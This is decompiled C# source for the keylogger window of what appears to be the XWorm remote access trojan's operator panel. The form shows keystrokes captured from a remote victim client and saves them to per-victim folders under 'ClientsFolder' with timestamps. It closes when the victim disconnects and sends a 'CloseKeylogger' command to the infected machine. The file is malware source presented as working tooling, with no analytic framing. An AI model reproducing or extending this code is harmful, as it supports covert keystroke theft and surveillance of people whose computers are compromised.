using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm
{
	// Token: 0x0200001D RID: 29
	[DesignerGenerated]
	public partial class Keylogger : Form
	{
		// Token: 0x0600060D RID: 1549 RVA: 0x00036DAC File Offset: 0x00034FAC
		public Keylogger()
		{
			base.FormClosing += this.Keylogger_FormClosing;
			this.Strb = new StringBuilder();
			this.InitializeComponent();
		}

		// Token: 0x1700023F RID: 575
		// (get) Token: 0x06000610 RID: 1552 RVA: 0x0003749A File Offset: 0x0003569A
		// (set) Token: 0x06000611 RID: 1553 RVA: 0x000374A4 File Offset: 0x000356A4
		internal virtual RichTextBox T1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000240 RID: 576
		// (get) Token: 0x06000612 RID: 1554 RVA: 0x000374AD File Offset: 0x000356AD
		// (set) Token: 0x06000613 RID: 1555 RVA: 0x000374B7 File Offset: 0x000356B7
		internal virtual MenuStrip MenuStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000241 RID: 577
		// (get) Token: 0x06000614 RID: 1556 RVA: 0x000374C0 File Offset: 0x000356C0
		// (set) Token: 0x06000615 RID: 1557 RVA: 0x000374CC File Offset: 0x000356CC
		internal virtual ToolStripMenuItem ToolStripMenuItem2
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem2_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem2;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem2 = value;
				toolStripMenuItem = this._ToolStripMenuItem2;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000242 RID: 578
		// (get) Token: 0x06000616 RID: 1558 RVA: 0x0003750F File Offset: 0x0003570F
		// (set) Token: 0x06000617 RID: 1559 RVA: 0x00037519 File Offset: 0x00035719
		internal virtual ToolStripTextBox TFind { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000243 RID: 579
		// (get) Token: 0x06000618 RID: 1560 RVA: 0x00037522 File Offset: 0x00035722
		// (set) Token: 0x06000619 RID: 1561 RVA: 0x0003752C File Offset: 0x0003572C
		internal virtual ToolStripMenuItem ToolStripMenuItem3
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem3_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem3;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem3 = value;
				toolStripMenuItem = this._ToolStripMenuItem3;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000244 RID: 580
		// (get) Token: 0x0600061A RID: 1562 RVA: 0x0003756F File Offset: 0x0003576F
		// (set) Token: 0x0600061B RID: 1563 RVA: 0x0003757C File Offset: 0x0003577C
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000245 RID: 581
		// (get) Token: 0x0600061C RID: 1564 RVA: 0x000375BF File Offset: 0x000357BF
		// (set) Token: 0x0600061D RID: 1565 RVA: 0x000375C9 File Offset: 0x000357C9
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000246 RID: 582
		// (get) Token: 0x0600061E RID: 1566 RVA: 0x000375D2 File Offset: 0x000357D2
		// (set) Token: 0x0600061F RID: 1567 RVA: 0x000375DC File Offset: 0x000357DC
		internal virtual ToolStripMenuItem CopyToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._CopyToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyToolStripMenuItem1_Click);
				ToolStripMenuItem copyToolStripMenuItem = this._CopyToolStripMenuItem1;
				if (copyToolStripMenuItem != null)
				{
					copyToolStripMenuItem.Click -= value2;
				}
				this._CopyToolStripMenuItem1 = value;
				copyToolStripMenuItem = this._CopyToolStripMenuItem1;
				if (copyToolStripMenuItem != null)
				{
					copyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000247 RID: 583
		// (get) Token: 0x06000620 RID: 1568 RVA: 0x0003761F File Offset: 0x0003581F
		// (set) Token: 0x06000621 RID: 1569 RVA: 0x0003762C File Offset: 0x0003582C
		internal virtual ToolStripMenuItem SelectAllToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._SelectAllToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SelectAllToolStripMenuItem1_Click);
				ToolStripMenuItem selectAllToolStripMenuItem = this._SelectAllToolStripMenuItem1;
				if (selectAllToolStripMenuItem != null)
				{
					selectAllToolStripMenuItem.Click -= value2;
				}
				this._SelectAllToolStripMenuItem1 = value;
				selectAllToolStripMenuItem = this._SelectAllToolStripMenuItem1;
				if (selectAllToolStripMenuItem != null)
				{
					selectAllToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000622 RID: 1570 RVA: 0x00037670 File Offset: 0x00035870
		private void ToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			bool flag = this.T1.Find(this.TFind.Text, checked(this.T1.SelectionStart + this.T1.SelectionLength), RichTextBoxFinds.None) == -1;
			if (flag)
			{
				this.T1.Find(this.TFind.Text, 0, RichTextBoxFinds.None);
			}
		}

		// Token: 0x06000623 RID: 1571 RVA: 0x000376D0 File Offset: 0x000358D0
		private void ToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = !string.IsNullOrEmpty(this.T1.Text);
				if (flag)
				{
					string text = Path.Combine(Application.StartupPath, "ClientsFolder", this.CID, "Keylogger");
					bool flag2 = !Directory.Exists(text);
					if (flag2)
					{
						Directory.CreateDirectory(text);
					}
					StreamWriter streamWriter = new StreamWriter(text + "\\KeyLogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".txt", false);
					streamWriter.WriteLine(this.T1.Text);
					streamWriter.Close();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000624 RID: 1572 RVA: 0x0003779C File Offset: 0x0003599C
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000625 RID: 1573 RVA: 0x000377F4 File Offset: 0x000359F4
		private void Keylogger_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("CloseKeylogger");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000626 RID: 1574 RVA: 0x00037832 File Offset: 0x00035A32
		private void CopyToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.T1.Copy();
		}

		// Token: 0x06000627 RID: 1575 RVA: 0x00037841 File Offset: 0x00035A41
		private void SelectAllToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.T1.SelectAll();
		}

		// Token: 0x0400027A RID: 634
		public Client C;

		// Token: 0x0400027B RID: 635
		public string CID;

		// Token: 0x0400027C RID: 636
		public StringBuilder Strb;
	}
}
